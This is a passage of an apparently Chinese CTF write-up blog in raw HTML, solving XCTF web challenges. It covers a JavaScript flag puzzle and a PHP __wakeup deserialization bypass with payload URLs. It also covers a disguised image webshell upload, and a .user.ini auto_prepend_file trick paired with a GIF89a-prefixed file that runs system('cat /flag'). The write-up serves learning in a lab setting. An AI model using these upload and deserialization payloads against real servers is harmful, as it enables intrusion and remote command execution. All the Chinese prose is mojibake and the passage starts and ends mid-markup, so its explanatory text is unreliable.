class="literal">null</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆç”¨åˆ°äº†æ­£åˆ™è¡¨è¾¾å¼<br><u>^è¡¨ç¤ºå¼€å¤´ä¸€å®šè¦åŒ¹é…åˆ°be0f23ï¼Œ$è¡¨ç¤ºç»“å°¾ä¸€å®šè¦åŒ¹é…åˆ°e98aa</u>ï¼Œå…¶å®ƒçš„åªè¦åŒ¹é…åˆ°å°±å¥½ï¼Œæ²¡æœ‰ä½ç½®è¦æ±‚<br>äºæ˜¯æˆ‘ä»¬æ„é€ eçš„å€¼</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">e</span><span class="operator">=</span>be0f233ac7be98aa</span><br></pre></td></tr></table></figure><p>å°†ä¸Šé¢çš„æ ¸å¿ƒä»£ç åç¼€æ”¹ä¸ºhtmlæ ¼å¼ï¼Œæ‰“å¼€å¦‚ä¸‹å›¾æ‰€ç¤º<br>åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°<br>æ¡†ä¸­è¾“å…¥eçš„å€¼<code>be0f233ac7be98aa</code>ï¼Œç‚¹å‡»Okï¼ˆå½“ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨åŸæ¥è·å¾—çš„web100æ–‡ä»¶æµè§ˆå™¨æ‰§è¡Œçš„è¾“å…¥æ¡†ä¸­è¾“å…¥be0f233ac7be98aaï¼‰</p><p><img src="https://img-blog.csdnimg.cn/20190624211524604.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>æ³¨1ï¼šå½“ç„¶ï¼Œå¦‚æœå¤§å®¶è§‰å¾—æ„é€ éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œè·å–flagçš„æ ¸å¿ƒä»£ç ï¼Œä»£ç å¦‚ä¸‹</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">var</span> s=[t,n,r,i];</span></span><br><span class="line"><span class="language-javascript">             <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">document</span>.<span class="title function_">write</span>(s[o%<span class="number">4</span>][<span class="number">0</span>]);s[o%<span class="number">4</span>].<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">document.write(<span class="regexp">s[o%4][0]</span>);s[o%4].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"><span class="regexp">//</span>è¾“å‡ºfl;éšååˆ é™¤fl</span><br><span class="line">/*</span><br><span class="line">ä»£ç è¿è¡Œè¯¦è§£ï¼š</span><br><span class="line">ç¬¬ä¸€æ­¥ï¼šdocument.write(<span class="regexp">s[0][0]</span>);s[<span class="number">0</span>].splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">ç¬¬äºŒæ­¥ï¼šdocument.write(t[<span class="number">0</span>]);t.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">ç¬¬ä¸‰æ­¥ï¼šdocument.write(<span class="string">&quot;fl&quot;</span>);åˆ é™¤t[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>]ä¸­ç¬¬ä¸€ä¸ªä½ç½®ï¼Œä¸€ä¸ªé¡¹ç›®ï¼Œå³åˆ é™¤fl</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.writeçš„åŠŸèƒ½å¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_34986769/</span>article<span class="regexp">/details/</span><span class="number">52160532</span></span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">splice</span><span class="params">()</span></span> æ–¹æ³•å‘/ä»æ•°ç»„ä¸­æ·»åŠ /åˆ é™¤é¡¹ç›®ï¼Œç„¶åè¿”å›è¢«åˆ é™¤çš„é¡¹ç›®ã€‚</span><br><span class="line">æ³¨é‡Šï¼šè¯¥æ–¹æ³•ä¼šæ”¹å˜åŸå§‹æ•°ç»„ã€‚</span><br><span class="line">è¯­æ³•</span><br><span class="line">arrayObject<span class="selector-class">.splice</span>(index,howmany,item1,.....,itemX)</span><br><span class="line">å‚æ•°                         æè¿°</span><br><span class="line">index                     å¿…éœ€ã€‚æ•´æ•°ï¼Œè§„å®šæ·»åŠ /åˆ é™¤é¡¹ç›®çš„ä½ç½®ï¼Œä½¿ç”¨è´Ÿæ•°å¯ä»æ•°ç»„ç»“å°¾å¤„è§„å®šä½ç½®ã€‚</span><br><span class="line">howmany                     å¿…éœ€ã€‚è¦åˆ é™¤çš„é¡¹ç›®æ•°é‡ã€‚å¦‚æœè®¾ç½®ä¸º <span class="number">0</span>ï¼Œåˆ™ä¸ä¼šåˆ é™¤é¡¹ç›®ã€‚</span><br><span class="line">item1, ..., itemX         å¯é€‰ã€‚å‘æ•°ç»„æ·»åŠ çš„æ–°é¡¹ç›®ã€‚</span><br></pre></td></tr></table></figure><h2 id="13-unserialize3"><a href="#13-unserialize3" class="headerlink" title="13.unserialize3"></a>13.unserialize3</h2><h3 id="1-é¢˜ç›®æè¿°-22"><a href="#1-é¢˜ç›®æè¿°-22" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2ï¼‰wp-7"><a href="#2ï¼‰wp-7" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™é“é¢˜éœ€è¦äº†è§£<a href="../../../../2022/05/28/Web-study">phpååºåˆ—åŒ–</a>ä¸­__wakeupæ¼æ´çš„åˆ©ç”¨,è¿˜æœ‰<a href="../../../../2022/05/28/Web-study">phpé­”æœ¯æ–¹æ³•</a></p><p><code>__wakeup()å‡½æ•°æ¼æ´åŸç†ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚</code></p><p>å¼€å§‹çš„ä»£ç ä¸å®Œæ•´ï¼Œæ˜¯ä¸€æ®µæ®‹ç¼ºçš„PHPä»£ç ï¼Œæ ¹æ®é¢˜ç›®åå­—çŸ¥é“è¿™æ˜¯ç»™ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œ?code&#x3D;å¯èƒ½æ˜¯æé†’éœ€è¦åœ¨urlåˆ©ç”¨ä»¥GETæ–¹å¼æäº¤codeå€¼</p><p><img src="https://img-blog.csdnimg.cn/669297deb27d4dce9bbdac477d78c6b7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹æ–¹æ˜¯æŠŠä»£ç è¡¥å……å®Œå–„åï¼Œå¹¶å¹¶è°ƒç”¨åºåˆ—åŒ–å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                        <span class="comment">//å®šä¹‰ä¸€ä¸ªåä¸ºxctfçš„ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;       <span class="comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»å±æ€§$flagï¼Œå€¼ä¸º111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;                                </span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»æ–¹æ³•__wakeup()ï¼Œè¾“å‡ºbad requestsåé€€å‡ºå½“å‰è„šæœ¬</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();    </span><br><span class="line"><span class="comment">//ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼ˆxctfï¼‰çš„å¯¹è±¡ä¸º</span></span><br><span class="line"><span class="comment">//è¿™é‡Œä¹Ÿå°±æ˜¯å®šä¹‰äº†äº†ä¸€ä¸ªæ–°çš„ç±»ç”¨æ¥ååºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       </span><br><span class="line"><span class="comment">//serialize()åºåˆ—åŒ–å‡½æ•°</span></span><br><span class="line"><span class="comment">//è¾“å‡ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œè¯¥phpä»£ç ï¼Œå¾—åˆ°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</p><p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20220627215806623.png" alt="image-20220627215806623"></p><p>å¦‚æœçœ‹ä¸æ‡‚ï¼Œå¯ä»¥çœ‹çœ‹æ–¹ä¾¿ä¸‹å›¾ç†è§£</p><p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>è¿™é‡Œå¦‚æœç›´æ¥è®¿é—®ï¼Œä¼šå¤±è´¥</p><p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:1:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p><p><img src="/2022/06/21/Gongfang-wp/image-20220627220136916.png" alt="image-20220627220136916"></p><p>å› ä¸ºæˆ‘ä»¬å¿½ç•¥äº†<code>__wakeup()</code>ï¼Œè¿™é‡Œå°±éœ€è¦äº†è§£phpçš„é­”æœ¯æ–¹æ³•å½“ä¸­çš„ç»•è¿‡__wakeup()</p><p><code>å¦‚ä½•ç»•è¿‡__wakeup()ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚ä»è€Œç»•è¿‡äº†__wakeup()å‡½æ•°</code></p><p>åœ¨è¿™ä¸²åºåˆ—åŒ–çš„ä»£ç ä¸­ï¼Œå¯¹è±¡å±æ€§æ•°ä¸º1ï¼ŒæŠŠä¸‹åˆ—çš„1æ”¹ä¸º2(&gt;1)ï¼Œå³å¯</p><p><code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>â€“&gt;</p><p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><hr><p>è¿™é‡Œæˆ‘æ’å…¥ä¸€ä¸ªæ–°å­¦åˆ°çš„payload</p><p><code>C:4:&quot;xctf&quot;:0:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>å‘ç°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡<code>__wakeup()</code>å‡½æ•°</p><p>Cä»£è¡¨è¿™ä¸ªç±»å®ç°äº†serializeableæ¥å£ï¼Œserializeableä¸æ”¯æŒwakeupï¼Œå°±ç»•è¿‡å»äº†</p><hr><p>ç„¶åpayload:</p><p><code>http://111.200.241.244:54024/?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</code></p><p>å¾—åˆ°flag</p><p>è¡¥å……ï¼š</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">phpå®ä¾‹åŒ–ï¼šæ˜¯æŒ‡åœ¨é¢å‘å¯¹è±¡çš„ç¼–ç¨‹ä¸­ï¼ŒæŠŠç”¨ç±»åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºå®ä¾‹åŒ–ï¼Œæ˜¯å°†ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µç±»ï¼Œå…·ä½“åˆ°è¯¥ç±»å®ç‰©çš„è¿‡ç¨‹ï¼Œå®ä¾‹åŒ–è¿‡ç¨‹ä¸­ä¸€èˆ¬ç”±ã€ç±»å å¯¹è±¡å = <span class="keyword">new</span> ç±»åï¼ˆå‚æ•°<span class="number">1</span>ï¼Œå‚æ•°<span class="number">2.</span>..å‚æ•°nï¼‰ã€‘æ„æˆã€‚</span><br><span class="line"></span><br><span class="line">phpç±»å¯¹è±¡æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</span><br><span class="line">ç±» âˆ’ å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ã€‚ç±»çš„å®šä¹‰åŒ…å«äº†æ•°æ®çš„å½¢å¼ä»¥åŠå¯¹æ•°æ®çš„æ“ä½œã€‚</span><br><span class="line">å¯¹è±¡ âˆ’ æ˜¯ç±»çš„å®ä¾‹ã€‚</span><br><span class="line">åœ¨é¢å‘å¯¹è±¡çš„ç¨‹åºè®¾è®¡ï¼ˆè‹±è¯­ï¼š<span class="built_in">Object</span>-oriented programmingï¼Œç¼©å†™ï¼šOOPï¼‰ä¸­ï¼Œå¯¹è±¡æ˜¯ä¸€ä¸ªç”±ä¿¡æ¯åŠå¯¹ä¿¡æ¯è¿›è¡Œå¤„ç†çš„æè¿°æ‰€ç»„æˆçš„æ•´ä½“ï¼Œæ˜¯å¯¹ç°å®ä¸–ç•Œçš„æŠ½è±¡ã€‚åœ¨ç°å®ä¸–ç•Œé‡Œæˆ‘ä»¬æ‰€é¢å¯¹çš„äº‹æƒ…éƒ½æ˜¯å¯¹è±¡ï¼Œå¦‚è®¡ç®—æœºã€ç”µè§†æœºã€è‡ªè¡Œè½¦ç­‰ã€‚</span><br></pre></td></tr></table></figure><h2 id="14-upload1"><a href="#14-upload1" class="headerlink" title="14.upload1"></a>14.upload1</h2><h3 id="1-é¢˜ç›®æè¿°-23"><a href="#1-é¢˜ç›®æè¿°-23" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-16"><a href="#2-wp-16" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…¸å‹çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯ä»¥å…ˆæŠŠupload-labsçº¿ä¸‹é¶åœºå­¦ä¹ ä¸€ä¸‹</p><p>å…ˆç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ï¼Œå‘ç°è¢«æ‹¦æˆª</p><p><img src="/2022/06/21/Gongfang-wp/image-20220704104557362.png" alt="image-20220704104557362"></p><p>äºæ˜¯æ„é€ ä¸€ä¸ªå›¾ç‰‡æœ¨é©¬ä¸Šä¼ ï¼Œç„¶åburpä¿®æ”¹åç¼€ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯</p><p><img src="/2022/06/21/Gongfang-wp/image-20220704104752019.png" alt="image-20220704104752019"></p><p><img src="/2022/06/21/Gongfang-wp/image-20220704104814064.png" alt="image-20220704104814064"></p><p>å‘ç°ä¸Šä¼ æˆåŠŸ</p><p><img src="/2022/06/21/Gongfang-wp/image-20220704104830480.png" alt="image-20220704104830480"></p><p>ç”¨èšå‰‘è¯•ç€è¿ä¸€ä¸‹</p><p><img src="/2022/06/21/Gongfang-wp/image-20220704105115729.png" alt="image-20220704105115729"></p><p>å‘ç°è¿æ¥æˆåŠŸï¼Œæ‰“å¼€çœ‹çœ‹ï¼Œåœ¨htmlä¸‹å‘ç°flag.php</p><p><img src="/2022/06/21/Gongfang-wp/image-20220704105139801.png" alt="image-20220704105139801"></p><p>æ‰“å¼€æ–‡ä»¶</p><p>å¾—åˆ°flag</p><hr><p>åé¢çš„é¢˜éš¾åº¦é£å‡ï¼Œæ°´å¹³æœ‰é™ï¼Œåé¢çš„é¢˜ä»…å†™ä¸€äº›ä¸ªäººç¬”è®°ï¼Œå»ºè®®è®¤çœŸé˜…è¯»å…¶ä»–å¤§ä½¬çš„wpï¼Œé‡åˆ°éš¾ç‚¹ï¼Œå»ºè®®å…ˆå·©å›ºæ¦‚å¿µåŸºç¡€</p><h2 id="15-easytornado"><a href="#15-easytornado" class="headerlink" title="15.easytornado"></a>15.easytornado</h2><p>ä¸€é“tornadoæ¡†æ¶é¢˜ï¼Œå±äºsstiæ³¨å…¥ï¼Œå»ºè®®å…ˆçœ‹ä¸€äº›æ–‡ç« </p><p>äº†è§£äº†å†å°è¯•å®Œæˆ</p><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="1-easyupload"><a href="#1-easyupload" class="headerlink" title="1.easyupload"></a>1.easyupload</h2><h3 id="1-é¢˜ç›®æè¿°-24"><a href="#1-é¢˜ç›®æè¿°-24" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>ä¸€ååˆæ ¼çš„é»‘å®¢çœ¼ä¸­ï¼Œæ‰€æœ‰çš„ä¸Šä¼ ç‚¹éƒ½æ˜¯å¼€å‘è€…ç•™ä¸‹çš„åé—¨</p><h3 id="2-wp-17"><a href="#2-wp-17" class="headerlink" title="2)wp"></a>2)wp</h3><p><u><em>è¿™é“é¢˜å†™çš„1æ˜Ÿï¼Œä½†æ˜¯è¿‡æ»¤åˆå¤šï¼Œè¿˜æ¶‰åŠäº†ä¸Šä¼ .user.iniæ–‡ä»¶ï¼Œå­¦åˆ°äº†,ä¸‹é¢æ˜¯å¤§ä½¬çš„wp</em></u></p><p>æœ¬é¢˜éœ€è¦åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ç‚¹ï¼Œé€šè¿‡ç»•è¿‡æœåŠ¡å™¨çš„å®‰å…¨é˜²æŠ¤ï¼Œè¾¾åˆ°getshellçš„ç›®çš„</p><p>æœ¬é¢˜çš„ä¸»è¦è€ƒç‚¹ä¸ºåˆ©ç”¨fastcgiçš„.user.iniç‰¹æ€§è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>è¿™é‡Œéœ€è¦ç»•è¿‡çš„ç‚¹å¦‚ä¸‹</p><ul><li>æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦æœ‰phpå­—ç¬¦ä¸²</li><li>æ£€æŸ¥åç¼€ä¸­æ˜¯å¦æœ‰htaccessæˆ–ph</li><li>æ£€æŸ¥æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯</li><li>æ–‡ä»¶MIMEç±»å‹</li></ul><p>å¯¹äºç¬¬ä¸€ç‚¹å¯ä»¥åˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼Œä¾‹å¦‚ <?=phpinfo();?></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">æŠŠshort_open_tag å­—æ®µæ”¹ä¸ºOnï¼Œå°±å¯ä»¥å®ç°çŸ­æ ‡ç­¾åŠŸèƒ½</span><br><span class="line"></span><br><span class="line">çŸ­æ ‡ç­¾ï¼š</span><br><span class="line"><span class="number">1</span>.èƒ½æ­£å¸¸è§£æç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.ä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡ºï¼Œåœ¨çŸ­æ ‡ç­¾çœ‹æ¥ï¼Œ<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br><span class="line">å°±ç›¸å½“äº</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">æ­£ç¡®ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æŠ¥é”™ï¼š</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">ä»è¿™ä¸ªå¯¹æ¯”è¯•éªŒæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼š</span><br><span class="line">åœ¨çŸ­æ ‡ç­¾æ¨¡å¼ä¸‹ï¼Œ</span><br><span class="line">æˆ‘ä»¬æ‰§è¡Œphpè¯­å¥phpå‡½æ•°ï¼Œéƒ½ç”¨ç±»ä¼¼äºè¿™æ ·å½¢å¼çš„phpæ–‡ä»¶ï¼š</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">ä½†æ˜¯æˆ‘ä»¬è¦è¾“å‡ºä¸€ä¸ªflagï¼Œæˆ–è€…å˜é‡æ—¶ï¼Œä½¿ç”¨<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>çš„å½¢å¼è¾“å‡º</span><br></pre></td></tr></table></figure><p>å¯¹äºç¬¬äºŒç‚¹å¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniä»¥åŠæ­£å¸¸jpgæ–‡ä»¶æ¥è¿›è¡Œgetshell,å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« </p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p><p>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</p><p> è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</p><p> å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</p><p>ç¬¬ä¸‰ç‚¹ç»•è¿‡æ–¹å¼å³åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ªå›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼Œæ¯”å¦‚<code>GIF89a</code></p><p>ç¬¬å››ç‚¹ç»•è¿‡æ–¹æ³•å³ä¿®æ”¹ä¸Šä¼ æ—¶çš„Content-Type</p><p>å› æ­¤æœ€ç»ˆçš„payloadä¸ºï¼š<br> ä¸Šä¼ .user.iniï¼Œå†…å®¹ä¸º</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ a.jpgï¼Œå†…å®¹ä¸º</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-file-includeã€æ±Ÿè‹å·¥åŒ æ¯ã€‘"><a href="#2-file-includeã€æ±Ÿè‹å·¥åŒ 